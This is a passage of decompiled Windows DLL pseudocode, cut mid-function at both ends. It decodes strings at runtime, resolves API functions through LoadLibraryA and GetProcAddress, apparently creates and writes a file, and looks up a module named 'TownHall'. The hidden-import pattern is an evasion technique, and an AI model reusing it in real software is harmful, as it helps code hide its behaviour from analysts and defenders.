    "  sub_1000B970(",
    "    v90,",
    "    v63,",
    "    v64,",
    "    v65,",
    "    v66,",
    "    (int)v67,",
    "    v68,",
    "    (_DWORD *)v69,",
    "    SDWORD1(v69),",
    "    SDWORD2(v69),",
    "    SHIDWORD(v69),",
    "    v70,",
    "    HIDWORD(v70));",
    "  LOBYTE(v99) = 12;",
    "  v20 = lpProcName;",
    "  v21 = (const WCHAR *)lpModuleName;",
    "  if ( v86 > 0xF )",
    "    v20 = (LPCSTR *)lpProcName[0];",
    "  HIDWORD(v70) = v20;",
    "  if ( v89 > 7 )",
    "    v21 = lpModuleName[0];",
    "  ModuleHandleW = GetModuleHandleW(v21);",
    "  ProcAddress = (int)GetProcAddress(ModuleHandleW, (LPCSTR)HIDWORD(v70));",
    "  v23 = (const CHAR *)lpLibFileName;",
    "  if ( v98 > 0xF )",
    "    v23 = lpLibFileName[0];",
    "  LibraryA = LoadLibraryA(v23);",
    "  if ( LibraryA )",
    "  {",
    "    v44 = v90;",
    "    if ( v92 > 0xF )",
    "      v44 = (void **)v90[0];",
    "    v45 = (void (__stdcall *)(void **, _DWORD))((int (__stdcall *)(HMODULE, void **))ProcAddress)(LibraryA, v44);",
    "    if ( v45 )",
    "    {",
    "      v46 = v93;",
    "      HIDWORD(v70) = 0;",
    "      if ( v95 > 7 )",
    "        v46 = (void **)v93[0];",
    "      v45(v46, HIDWORD(v70));",
    "    }",
    "    FreeLibrary(LibraryA);",
    "    sub_10009D70((size_t *)&v69, v93);",
    "    v42 = v75;",
    "    sub_1000AD50((int)v75, (WCHAR *)v69, SDWORD1(v69), SDWORD2(v69), SHIDWORD(v69), v70, HIDWORD(v70));",
    "    if ( v92 > 0xF )",
    "    {",
    "      v47 = v90[0];",
    "      v48 = v92 + 1;",
    "      if ( v92 + 1 >= 0x1000 )",
    "      {",
    "        v47 = (void *)*((_DWORD *)v90[0] - 1);",
    "        v48 = v92 + 36;",
    "        if ( (unsigned int)((char *)v90[0] - (char *)v47 - 4) > 0x1F )",
    "          goto LABEL_100;",
    "      }",
    "      HIDWORD(v70) = v48;",
    "      sub_100154EB(v47);",
    "    }",
    "    v91 = 0;",
    "    v92 = 15;",
    "    LOBYTE(v90[0]) = 0;",
    "    if ( v89 > 7 )",
    "    {",
    "      v49 = (WCHAR *)lpModuleName[0];",
    "      v50 = 2 * v89 + 2;",
    "      if ( v50 >= 0x1000 )",
    "      {",
    "        v49 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v50 = 2 * v89 + 37;",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v49 - 4) > 0x1F )",
    "          goto LABEL_100;",
    "      }",
    "      HIDWORD(v70) = v50;",
    "      sub_100154EB(v49);",
    "    }",
    "    v88 = 0;",
    "    v89 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v86 > 0xF )",
    "    {",
    "      v51 = (CHAR *)lpProcName[0];",
    "      v52 = v86 + 1;",
    "      if ( v86 + 1 >= 0x1000 )",
    "      {",
    "        v51 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v52 = v86 + 36;",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v51 - 4) > 0x1F )",
    "          goto LABEL_100;",
    "      }",
    "      HIDWORD(v70) = v52;",
    "      sub_100154EB(v51);",
    "    }",
    "    v85 = 0;",
    "    v86 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v95 > 7 )",
    "    {",
    "      v53 = v93[0];",
    "      v54 = 2 * v95 + 2;",
    "      if ( v54 >= 0x1000 )",
    "      {",
    "        v53 = (void *)*((_DWORD *)v93[0] - 1);",
    "        v54 = 2 * v95 + 37;",
    "        if ( (unsigned int)((char *)v93[0] - (char *)v53 - 4) > 0x1F )",
    "          goto LABEL_100;",
    "      }",
    "      HIDWORD(v70) = v54;",
    "      sub_100154EB(v53);",
    "    }",
    "    v94 = 0;",
    "    v95 = 7;",
    "    LOWORD(v93[0]) = 0;",
    "    if ( v98 > 0xF )",
    "    {",
    "      v55 = (CHAR *)lpLibFileName[0];",
    "      v56 = v98 + 1;",
    "      if ( v98 + 1 >= 0x1000 )",
    "      {",
    "        v55 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "        v56 = v98 + 36;",
    "        if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v55 - 4) > 0x1F )",
    "          goto LABEL_100;",
    "      }",
    "      HIDWORD(v70) = v56;",
    "      sub_100154EB(v55);",
    "    }",
    "    v97 = 0;",
    "    v98 = 15;",
    "    LOBYTE(lpLibFileName[0]) = 0;",
    "    if ( v83 > 0xF )",
    "    {",
    "      v57 = v81[0];",
    "      v58 = v83 + 1;",
    "      if ( v83 + 1 >= 0x1000 )",
    "      {",
    "        v57 = (void *)*((_DWORD *)v81[0] - 1);",
    "        v58 = v83 + 36;",
    "        if ( (unsigned int)((char *)v81[0] - (char *)v57 - 4) > 0x1F )",
    "          goto LABEL_100;",
    "      }",
    "      HIDWORD(v70) = v58;",
    "      sub_100154EB(v57);",
    "    }",
    "    if ( v80 > 0xF )",
    "    {",
    "      v59 = v78[0];",
    "      v60 = v80 + 1;",
    "      if ( v80 + 1 >= 0x1000 )",
    "      {",
    "        v59 = (void *)*((_DWORD *)v78[0] - 1);",
    "        v60 = v80 + 36;",
    "        if ( (unsigned int)((char *)v78[0] - (char *)v59 - 4) > 0x1F )",
    "          goto LABEL_100;",
    "      }",
    "      HIDWORD(v70) = v60;",
    "      sub_100154EB(v59);",
    "    }",
    "    if ( a7 <= 0xF )",
    "      return v42;",
    "    v61 = Src;",
    "    v62 = a7 + 1;",
    "    if ( a7 + 1 < 0x1000",
    "      || (v61 = (void *)*(Src - 1), v62 = a7 + 36, (unsigned int)((char *)Src - (_BYTE *)v61 - 4) <= 0x1F) )",
    "    {",
    "      HIDWORD(v70) = v62;",
    "      sub_100154EB(v61);",
    "      return v42;",
    "    }",
    "LABEL_100:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  HIDWORD(v70) = 0;",
    "  LODWORD(v70) = &unk_1003B3A1;",
    "  v25 = v75;",
    "  *(_OWORD *)v75 = 0;",
    "  v25[4] = 0;",
    "  v25[5] = 0;",
    "  sub_100018C0(v25, (void *)v70, HIDWORD(v70));",
    "  if ( v92 > 0xF )",
    "  {",
    "    v26 = v90[0];",
    "    v27 = v92 + 1;",
    "    if ( v92 + 1 >= 0x1000 )",
    "    {",
    "      v26 = (void *)*((_DWORD *)v90[0] - 1);",
    "      v27 = v92 + 36;",
    "      if ( (unsigned int)((char *)v90[0] - (char *)v26 - 4) > 0x1F )",
    "        goto LABEL_100;",
    "    }",
    "    HIDWORD(v70) = v27;",
    "    sub_100154EB(v26);",
    "  }",
    "  v91 = 0;",
    "  v92 = 15;",
    "  LOBYTE(v90[0]) = 0;",
    "  if ( v89 > 7 )",
    "  {",
    "    v28 = (WCHAR *)lpModuleName[0];",
    "    v29 = 2 * v89 + 2;",
    "    if ( v29 >= 0x1000 )",
    "    {",
    "      v28 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "      v29 = 2 * v89 + 37;",
    "      if ( (unsigned int)((char *)lpModuleName[0] - (char *)v28 - 4) > 0x1F )",
    "        goto LABEL_100;",
    "    }",
    "    HIDWORD(v70) = v29;",
    "    sub_100154EB(v28);",
    "  }",
    "  v88 = 0;",
    "  v89 = 7;",
    "  LOWORD(lpModuleName[0]) = 0;",
    "  if ( v86 > 0xF )",
    "  {",
    "    v30 = (CHAR *)lpProcName[0];",
    "    v31 = v86 + 1;",
    "    if ( v86 + 1 >= 0x1000 )",
    "    {",
    "      v30 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "      v31 = v86 + 36;",
    "      if ( (unsigned int)(lpProcName[0] - (LPCSTR)v30 - 4) > 0x1F )",
    "        goto LABEL_100;",
    "    }",
    "    HIDWORD(v70) = v31;",
    "    sub_100154EB(v30);",
    "  }",
    "  v85 = 0;",
    "  v86 = 15;",
    "  LOBYTE(lpProcName[0]) = 0;",
    "  if ( v95 > 7 )",
    "  {",
    "    v32 = v93[0];",
    "    v33 = 2 * v95 + 2;",
    "    if ( v33 >= 0x1000 )",
    "    {",
    "      v32 = (void *)*((_DWORD *)v93[0] - 1);",
    "      v33 = 2 * v95 + 37;",
    "      if ( (unsigned int)((char *)v93[0] - (char *)v32 - 4) > 0x1F )",
    "        goto LABEL_100;",
    "    }",
    "    HIDWORD(v70) = v33;",
    "    sub_100154EB(v32);",
    "  }",
    "  v94 = 0;",
    "  v95 = 7;",
    "  LOWORD(v93[0]) = 0;",
    "  if ( v98 > 0xF )",
    "  {",
    "    v34 = (CHAR *)lpLibFileName[0];",
    "    v35 = v98 + 1;",
    "    if ( v98 + 1 >= 0x1000 )",
    "    {",
    "      v34 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "      v35 = v98 + 36;",
    "      if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v34 - 4) > 0x1F )",
    "        goto LABEL_100;",
    "    }",
    "    HIDWORD(v70) = v35;",
    "    sub_100154EB(v34);",
    "  }",
    "  v97 = 0;",
    "  v98 = 15;",
    "  LOBYTE(lpLibFileName[0]) = 0;",
    "  if ( v83 > 0xF )",
    "  {",
    "    v36 = v81[0];",
    "    v37 = v83 + 1;",
    "    if ( v83 + 1 >= 0x1000 )",
    "    {",
    "      v36 = (void *)*((_DWORD *)v81[0] - 1);",
    "      v37 = v83 + 36;",
    "      if ( (unsigned int)((char *)v81[0] - (char *)v36 - 4) > 0x1F )",
    "        goto LABEL_100;",
    "    }",
    "    HIDWORD(v70) = v37;",
    "    sub_100154EB(v36);",
    "  }",
    "  if ( v80 > 0xF )",
    "  {",
    "    v38 = v78[0];",
    "    v39 = v80 + 1;",
    "    if ( v80 + 1 >= 0x1000 )",
    "    {",
    "      v38 = (void *)*((_DWORD *)v78[0] - 1);",
    "      v39 = v80 + 36;",
    "      if ( (unsigned int)((char *)v78[0] - (char *)v38 - 4) > 0x1F )",
    "        goto LABEL_100;",
    "    }",
    "    HIDWORD(v70) = v39;",
    "    sub_100154EB(v38);",
    "  }",
    "  if ( a7 > 0xF )",
    "  {",
    "    v40 = Src;",
    "    v41 = a7 + 1;",
    "    if ( a7 + 1 < 0x1000",
    "      || (v40 = (void *)*(Src - 1), v41 = a7 + 36, (unsigned int)((char *)Src - (_BYTE *)v40 - 4) <= 0x1F) )",
    "    {",
    "      HIDWORD(v70) = v41;",
    "      sub_100154EB(v40);",
    "      return v75;",
    "    }",
    "    goto LABEL_100;",
    "  }",
    "  return v75;",
    "}",
    "",
    "",
    "char __stdcall sub_1000C310(",
    "        _DWORD *a1,",
    "        int a2,",
    "        int a3,",
    "        int a4,",
    "        int a5,",
    "        unsigned int a6,",
    "        _DWORD *a7,",
    "        int a8,",
    "        int a9,",
    "        int a10,",
    "        int a11,",
    "        unsigned int a12)",
    "{",
    "  _DWORD *v12; // ebx",
    "  const CHAR *v13; // ecx",
    "  const WCHAR *v14; // eax",
    "  HMODULE ModuleHandleW; // eax",
    "  FARPROC ProcAddress; // eax",
    "  const CHAR *v17; // ecx",
    "  HMODULE LibraryA; // eax",
    "  HMODULE v19; // edi",
    "  void **v20; // eax",
    "  int (__stdcall *v21)(_DWORD **, int, int, _DWORD, int, int, CHAR *); // eax",
    "  _DWORD **v22; // ecx",
    "  int v23; // eax",
    "  const CHAR *v24; // ebx",
    "  void **v25; // eax",
    "  int (__stdcall *v26)(const CHAR *, _DWORD **, int, int, CHAR *); // eax",
    "  _DWORD **v27; // ecx",
    "  int v28; // eax",
    "  char v29; // bl",
    "  void *v30; // edx",
    "  const CHAR *v31; // ecx",
    "  void *v32; // edx",
    "  const CHAR *v33; // ecx",
    "  CHAR *v34; // edx",
    "  const CHAR *v35; // ecx",
    "  WCHAR *v36; // edx",
    "  const CHAR *v37; // ecx",
    "  CHAR *v38; // edx",
    "  const CHAR *v39; // ecx",
    "  _BYTE *v40; // edx",
    "  const CHAR *v41; // ecx",
    "  void *v42; // edx",
    "  const CHAR *v43; // ecx",
    "  _DWORD *v45; // [esp-30h] [ebp-E0h] BYREF",
    "  int v46; // [esp-2Ch] [ebp-DCh]",
    "  int v47; // [esp-28h] [ebp-D8h]",
    "  int v48; // [esp-24h] [ebp-D4h]",
    "  unsigned int v49; // [esp-20h] [ebp-D0h]",
    "  unsigned int v50; // [esp-1Ch] [ebp-CCh]",
    "  CHAR *v51; // [esp-18h] [ebp-C8h] BYREF",
    "  int v52; // [esp-14h] [ebp-C4h]",
    "  int v53; // [esp-10h] [ebp-C0h]",
    "  int v54; // [esp-Ch] [ebp-BCh]",
    "  int v55; // [esp-8h] [ebp-B8h]",
    "  CHAR *v56; // [esp-4h] [ebp-B4h]",
    "  int v57; // [esp+10h] [ebp-A0h]",
    "  CHAR **v58; // [esp+14h] [ebp-9Ch]",
    "  _DWORD *v59; // [esp+18h] [ebp-98h]",
    "  CHAR **v60; // [esp+1Ch] [ebp-94h]",
    "  CHAR **v61; // [esp+20h] [ebp-90h]",
    "  void *Block[5]; // [esp+24h] [ebp-8Ch] BYREF",
    "  unsigned int v63; // [esp+38h] [ebp-78h]",
    "  LPCWSTR lpModuleName[5]; // [esp+3Ch] [ebp-74h] BYREF",
    "  unsigned int v65; // [esp+50h] [ebp-60h]",
    "  LPCSTR lpProcName[5]; // [esp+54h] [ebp-5Ch] BYREF",
    "  unsigned int v67; // [esp+68h] [ebp-48h]",
    "  void *v68[5]; // [esp+6Ch] [ebp-44h] BYREF",
    "  unsigned int v69; // [esp+80h] [ebp-30h]",
    "  LPCSTR lpLibFileName[5]; // [esp+84h] [ebp-2Ch] BYREF",
    "  unsigned int v71; // [esp+98h] [ebp-18h]",
    "  int v72; // [esp+9Ch] [ebp-14h] BYREF",
    "  int v73; // [esp+ACh] [ebp-4h]",
    "",
    "  v73 = 1;",
    "  v57 = a11;",
    "  v72 = 0;",
    "  v12 = (_DWORD *)sub_10002FE0();",
    "  v60 = &v51;",
    "  v59 = v12;",
    "  sub_10009E70(&v45, v12);",
    "  sub_1000B000(&v51, v45, v46, v47, v48, v49, v50);",
    "  LOBYTE(v73) = 2;",
    "  sub_10009E70(&v45, v12 + 186);",
    "  LOBYTE(v73) = 1;",
    "  sub_1000B970(lpLibFileName, v45, v46, v47, v48, v49, v50, v51, v52, v53, v54, v55, (unsigned int)v56);",
    "  LOBYTE(v73) = 3;",
    "  sub_10009E70(&v51, lpLibFileName);",
    "  sub_1000AA30((int)lpModuleName, v51, v52, v53, v54, v55, (unsigned int)v56);",
    "  LOBYTE(v73) = 4;",
    "  v61 = &v51;",
    "  sub_10009E70(&v45, v12 + 6);",
    "  sub_1000B000(&v51, v45, v46, v47, v48, v49, v50);",
    "  LOBYTE(v73) = 5;",
    "  sub_10009E70(&v45, v12 + 192);",
    "  LOBYTE(v73) = 4;",
    "  sub_1000B970(lpProcName, v45, v46, v47, v48, v49, v50, v51, v52, v53, v54, v55, (unsigned int)v56);",
    "  LOBYTE(v73) = 6;",
    "  v13 = (const CHAR *)lpProcName;",
    "  v14 = (const WCHAR *)lpModuleName;",
    "  if ( v67 > 0xF )",
    "    v13 = lpProcName[0];",
    "  v56 = (CHAR *)v13;",
    "  if ( v65 > 7 )",
    "    v14 = lpModuleName[0];",
    "  ModuleHandleW = GetModuleHandleW(v14);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v56);",
    "  v17 = (const CHAR *)lpLibFileName;",
    "  v60 = (CHAR **)ProcAddress;",
    "  if ( v71 > 0xF )",
    "    v17 = lpLibFileName[0];",
    "  LibraryA = LoadLibraryA(v17);",
    "  v61 = &v51;",
    "  v19 = LibraryA;",
    "  sub_10009E70(&v45, v12 + 30);",
    "  sub_1000B000(&v51, v45, v46, v47, v48, v49, v50);",
    "  LOBYTE(v73) = 7;",
    "  sub_10009E70(&v45, v12 + 216);",
    "  LOBYTE(v73) = 6;",
    "  sub_1000B970(v68, v45, v46, v47, v48, v49, v50, v51, v52, v53, v54, v55, (unsigned int)v56);",
    "  LOBYTE(v73) = 8;",
    "  if ( !v19 )",
    "    goto LABEL_27;",
    "  v20 = v68;",
    "  if ( v69 > 0xF )",
    "    v20 = (void **)v68[0];",
    "  v21 = (int (__stdcall *)(_DWORD **, int, int, _DWORD, int, int, CHAR *))((int (__stdcall *)(HMODULE, void **))v60)(",
    "                                                                            v19,",
    "                                                                            v20);",
    "  v56 = 0;",
    "  if ( !v21 )",
    "  {",
    "    CloseHandle(v56);",
    "    FreeLibrary(v19);",
    "LABEL_27:",
    "    v29 = 0;",
    "    goto LABEL_28;",
    "  }",
    "  v22 = &a1;",
    "  v55 = 128;",
    "  if ( a6 > 0xF )",
    "    v22 = (_DWORD **)a1;",
    "  v23 = v21(v22, -1073741824, 1, 0, 1, v55, v56);",
    "  v58 = &v51;",
    "  v24 = (const CHAR *)v23;",
    "  sub_10009E70(&v45, v59 + 36);",
    "  sub_1000B000(&v51, v45, v46, v47, v48, v49, v50);",
    "  LOBYTE(v73) = 9;",
    "  sub_10009E70(&v45, v59 + 222);",
    "  LOBYTE(v73) = 8;",
    "  sub_1000B970(Block, v45, v46, v47, v48, v49, v50, v51, v52, v53, v54, v55, (unsigned int)v56);",
    "  LOBYTE(v73) = 10;",
    "  v25 = Block;",
    "  if ( v63 > 0xF )",
    "    v25 = (void **)Block[0];",
    "  v26 = (int (__stdcall *)(const CHAR *, _DWORD **, int, int, CHAR *))((int (__stdcall *)(HMODULE, void **))v60)(",
    "                                                                        v19,",
    "                                                                        v25);",
    "  if ( v26 )",
    "  {",
    "    v56 = 0;",
    "    v55 = (int)&v72;",
    "    v54 = v57;",
    "    v27 = &a7;",
    "    if ( a12 > 0xF )",
    "      v27 = (_DWORD **)a7;",
    "    v28 = v26(v24, v27, v54, v55, v56);",
    "    v56 = (CHAR *)v24;",
    "    if ( v28 )",
    "    {",
    "      CloseHandle(v56);",
    "      FreeLibrary(v19);",
    "      v29 = 1;",
    "      goto LABEL_22;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v56 = (CHAR *)v24;",
    "  }",
    "  CloseHandle(v56);",
    "  FreeLibrary(v19);",
    "  v29 = 0;",
    "LABEL_22:",
    "  if ( v63 > 0xF )",
    "  {",
    "    v30 = Block[0];",
    "    v31 = (const CHAR *)(v63 + 1);",
    "    if ( v63 + 1 >= 0x1000 )",
    "    {",
    "      v30 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v31 = (const CHAR *)(v63 + 36);",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v30 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    v56 = (CHAR *)v31;",
    "    sub_100154EB(v30);",
    "  }",
    "LABEL_28:",
    "  if ( v69 > 0xF )",
    "  {",
    "    v32 = v68[0];",
    "    v33 = (const CHAR *)(v69 + 1);",
    "    if ( v69 + 1 >= 0x1000 )",
    "    {",
    "      v32 = (void *)*((_DWORD *)v68[0] - 1);",
    "      v33 = (const CHAR *)(v69 + 36);",
    "      if ( (unsigned int)((char *)v68[0] - (char *)v32 - 4) > 0x1F )",
    "        goto LABEL_54;",
    "    }",
    "    v56 = (CHAR *)v33;",
    "    sub_100154EB(v32);",
    "  }",
    "  v68[4] = 0;",
    "  v69 = 15;",
    "  LOBYTE(v68[0]) = 0;",
    "  if ( v67 > 0xF )",
    "  {",
    "    v34 = (CHAR *)lpProcName[0];",
    "    v35 = (const CHAR *)(v67 + 1);",
    "    if ( v67 + 1 >= 0x1000 )",
    "    {",
    "      v34 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "      v35 = (const CHAR *)(v67 + 36);",
    "      if ( (unsigned int)(lpProcName[0] - (LPCSTR)v34 - 4) > 0x1F )",
    "        goto LABEL_54;",
    "    }",
    "    v56 = (CHAR *)v35;",
    "    sub_100154EB(v34);",
    "  }",
    "  lpProcName[4] = 0;",
    "  v67 = 15;",
    "  LOBYTE(lpProcName[0]) = 0;",
    "  if ( v65 > 7 )",
    "  {",
    "    v36 = (WCHAR *)lpModuleName[0];",
    "    v37 = (const CHAR *)(2 * v65 + 2);",
    "    if ( (unsigned int)v37 >= 0x1000 )",
    "    {",
    "      v36 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "      v37 = (const CHAR *)(2 * v65 + 37);",
    "      if ( (unsigned int)((char *)lpModuleName[0] - (char *)v36 - 4) > 0x1F )",
    "        goto LABEL_54;",
    "    }",
    "    v56 = (CHAR *)v37;",
    "    sub_100154EB(v36);",
    "  }",
    "  lpModuleName[4] = 0;",
    "  v65 = 7;",
    "  LOWORD(lpModuleName[0]) = 0;",
    "  if ( v71 > 0xF )",
    "  {",
    "    v38 = (CHAR *)lpLibFileName[0];",
    "    v39 = (const CHAR *)(v71 + 1);",
    "    if ( v71 + 1 >= 0x1000 )",
    "    {",
    "      v38 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "      v39 = (const CHAR *)(v71 + 36);",
    "      if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v38 - 4) > 0x1F )",
    "        goto LABEL_54;",
    "    }",
    "    v56 = (CHAR *)v39;",
    "    sub_100154EB(v38);",
    "  }",
    "  lpLibFileName[4] = 0;",
    "  v71 = 15;",
    "  LOBYTE(lpLibFileName[0]) = 0;",
    "  if ( a6 > 0xF )",
    "  {",
    "    v40 = a1;",
    "    v41 = (const CHAR *)(a6 + 1);",
    "    if ( a6 + 1 >= 0x1000 )",
    "    {",
    "      v40 = (_BYTE *)*(a1 - 1);",
    "      v41 = (const CHAR *)(a6 + 36);",
    "      if ( (unsigned int)((char *)a1 - v40 - 4) > 0x1F )",
    "        goto LABEL_54;",
    "    }",
    "    v56 = (CHAR *)v41;",
    "    sub_100154EB(v40);",
    "  }",
    "  a5 = 0;",
    "  a6 = 15;",
    "  LOBYTE(a1) = 0;",
    "  if ( a12 > 0xF )",
    "  {",
    "    v42 = a7;",
    "    v43 = (const CHAR *)(a12 + 1);",
    "    if ( a12 + 1 < 0x1000",
    "      || (v42 = (void *)*(a7 - 1), v43 = (const CHAR *)(a12 + 36), (unsigned int)((char *)a7 - (_BYTE *)v42 - 4) <= 0x1F) )",
    "    {",
    "      v56 = (CHAR *)v43;",
    "      sub_100154EB(v42);",
    "      return v29;",
    "    }",
    "LABEL_54:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return v29;",
    "}",
    "",
    "",
    "int sub_1000C790()",
    "{",
    "  _DWORD *v0; // edi",
    "  wchar_t *v1; // eax",
    "  const CHAR *v2; // ecx",
    "  const WCHAR *v3; // eax",
    "  HMODULE ModuleHandleW; // eax",
    "  FARPROC ProcAddress; // eax",
    "  const CHAR *v6; // ecx",
    "  int v7; // esi",
    "  HMODULE v8; // edi",
    "  void **v9; // eax",
    "  void (__stdcall *v10)(_DWORD, void **, _DWORD, _DWORD, _DWORD, int, _DWORD, _DWORD, _BYTE *, LPCSTR); // esi",
    "  void **v11; // eax",
    "  void *v12; // edx",
    "  const CHAR *v13; // ecx",
    "  void *v14; // edx",
    "  const CHAR *v15; // ecx",
    "  void *v16; // edx",
    "  const CHAR *v17; // ecx",
    "  CHAR *v18; // edx",
    "  const CHAR *v19; // ecx",
    "  WCHAR *v20; // edx",
    "  const CHAR *v21; // ecx",
    "  CHAR *v22; // edx",
    "  const CHAR *v23; // ecx",
    "  void *v24; // edx",
    "  const CHAR *v25; // ecx",
    "  void *v26; // edx",
    "  const CHAR *v27; // ecx",
    "  wchar_t *v28; // edx",
    "  const CHAR *v29; // ecx",
    "  _DWORD *v31; // [esp-30h] [ebp-7A4h] BYREF",
    "  int v32; // [esp-2Ch] [ebp-7A0h]",
    "  int v33; // [esp-28h] [ebp-79Ch]",
    "  int v34; // [esp-24h] [ebp-798h]",
    "  unsigned int v35; // [esp-20h] [ebp-794h]",
    "  unsigned int v36; // [esp-1Ch] [ebp-790h]",
    "  CHAR *v37; // [esp-18h] [ebp-78Ch] BYREF",
    "  int v38; // [esp-14h] [ebp-788h]",
    "  int v39; // [esp-10h] [ebp-784h]",
    "  int v40; // [esp-Ch] [ebp-780h]",
    "  int v41; // [esp-8h] [ebp-77Ch]",
    "  LPCSTR v42; // [esp-4h] [ebp-778h]",
    "  CHAR **v43; // [esp+Ch] [ebp-768h]",
    "  HMODULE hLibModule; // [esp+14h] [ebp-760h]",
    "  CHAR **v45; // [esp+18h] [ebp-75Ch]",
    "  HANDLE hObject[4]; // [esp+1Ch] [ebp-758h] BYREF",
    "  HMODULE phModule; // [esp+2Ch] [ebp-748h] BYREF",
    "  _BYTE v48[68]; // [esp+30h] [ebp-744h] BYREF",
    "  wchar_t *Format[5]; // [esp+74h] [ebp-700h] BYREF",
    "  unsigned int v50; // [esp+88h] [ebp-6ECh]",
    "  void *v51[5]; // [esp+8Ch] [ebp-6E8h] BYREF",
    "  unsigned int v52; // [esp+A0h] [ebp-6D4h]",
    "  void *v53[5]; // [esp+A4h] [ebp-6D0h] BYREF",
    "  unsigned int v54; // [esp+B8h] [ebp-6BCh]",
    "  void *v55[4]; // [esp+BCh] [ebp-6B8h] BYREF",
    "  int v56; // [esp+CCh] [ebp-6A8h]",
    "  unsigned int v57; // [esp+D0h] [ebp-6A4h]",
    "  void *v58[4]; // [esp+D4h] [ebp-6A0h] BYREF",
    "  int v59; // [esp+E4h] [ebp-690h]",
    "  unsigned int v60; // [esp+E8h] [ebp-68Ch]",
    "  LPCWSTR lpModuleName[5]; // [esp+ECh] [ebp-688h] BYREF",
    "  unsigned int v62; // [esp+100h] [ebp-674h]",
    "  LPCSTR lpProcName[5]; // [esp+104h] [ebp-670h] BYREF",
    "  unsigned int v64; // [esp+118h] [ebp-65Ch]",
    "  void *Block[5]; // [esp+11Ch] [ebp-658h] BYREF",
    "  unsigned int v66; // [esp+130h] [ebp-644h]",
    "  LPCSTR lpLibFileName[5]; // [esp+134h] [ebp-640h] BYREF",
    "  unsigned int v68; // [esp+148h] [ebp-62Ch]",
    "  wchar_t Buffer[520]; // [esp+14Ch] [ebp-628h] BYREF",
    "  WCHAR Filename[260]; // [esp+55Ch] [ebp-218h] BYREF",
    "  int v71; // [esp+770h] [ebp-4h]",
    "",
    "  v0 = (_DWORD *)sub_10002FE0();",
    "  sub_10009E70(&v31, v0 + 456);",
    "  sub_1000B000(&v37, v31, v32, v33, v34, v35, v36);",
    "  sub_1000AA30((int)Format, v37, v38, v39, v40, v41, (unsigned int)v42);",
    "  v71 = 0;",
    "  memset(v48, 0, sizeof(v48));",
    "  phModule = 0;",
    "  *(_OWORD *)hObject = 0;",
    "  memset(Filename, 0, sizeof(Filename));",
    "  if ( !GetModuleHandleExW(6u, L\"TownHall\", &phModule) || !GetModuleFileNameW(phModule, Filename, 0x104u) )",
    "  {",
    "    v7 = 0;",
    "    goto LABEL_52;",
    "  }",
    "  v56 = 0;",
    "  v57 = 0;",
    "  *(_OWORD *)v55 = 0;",
    "  sub_1000A170(v55, Filename, wcslen(Filename));",
    "  LOBYTE(v71) = 1;",
    "  sub_10009D70((size_t *)&v37, v55);",
    "  sub_1000AD50((int)v51, (WCHAR *)v37, v38, v39, v40, v41, (unsigned int)v42);",
    "  LOBYTE(v71) = 2;",
    "  v1 = (wchar_t *)Format;",
    "  v42 = (LPCSTR)Filename;",
    "  if ( v50 > 7 )",
    "    v1 = Format[0];",
    "  sub_1000A900(Buffer, 0x208u, v1);",
    "  v45 = &v37;",
    "  sub_10009E70(&v31, v0);",
    "  sub_1000B000(&v37, v31, v32, v33, v34, v35, v36);",
    "  LOBYTE(v71) = 3;",
    "  sub_10009E70(&v31, v0 + 186);",
    "  LOBYTE(v71) = 2;",
    "  sub_1000B970(lpLibFileName, v31, v32, v33, v34, v35, v36, v37, v38, v39, v40, v41, (unsigned int)v42);",
    "  LOBYTE(v71) = 4;",
    "  sub_10009E70(&v37, lpLibFileName);",
    "  sub_1000AA30((int)lpModuleName, v37, v38, v39, v40, v41, (unsigned int)v42);",
    "  LOBYTE(v71) = 5;",
    "  v45 = &v37;",
    "  sub_10009E70(&v31, v0 + 6);",
    "  sub_1000B000(&v37, v31, v32, v33, v34, v35, v36);",
    "  LOBYTE(v71) = 6;",
    "  sub_10009E70(&v31, v0 + 192);",
    "  LOBYTE(v71) = 5;",
    "  sub_1000B970(lpProcName, v31, v32, v33, v34, v35, v36, v37, v38, v39, v40, v41, (unsigned int)v42);",
    "  LOBYTE(v71) = 7;",
    "  v2 = (const CHAR *)lpProcName;",
    "  v3 = (const WCHAR *)lpModuleName;",
    "  if ( v64 > 0xF )",
    "    v2 = lpProcName[0];",
    "  v42 = v2;",
    "  if ( v62 > 7 )",
    "    v3 = lpModuleName[0];",
    "  ModuleHandleW = GetModuleHandleW(v3);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v42);",
    "  v6 = (const CHAR *)lpLibFileName;",
    "  v45 = (CHAR **)ProcAddress;",
    "  if ( v68 > 0xF )",
    "    v6 = lpLibFileName[0];",
    "  hLibModule = LoadLibraryA(v6);",
    "  if ( hLibModule )",
    "  {",
    "    v43 = &v37;",
    "    sub_10009E70(&v31, v0 + 156);",
    "    sub_1000B000(&v37, v31, v32, v33, v34, v35, v36);",
    "    LOBYTE(v71) = 8;",
    "    sub_10009E70(&v31, v0 + 468);",
    "    LOBYTE(v71) = 7;",
    "    sub_1000B970(v53, v31, v32, v33, v34, v35, v36, v37, v38, v39, v40, v41, (unsigned int)v42);",
    "    v8 = hLibModule;",
    "    v9 = v53;",
    "    LOBYTE(v71) = 9;",
    "    if ( v54 > 0xF )",
    "      v9 = (void **)v53[0];",
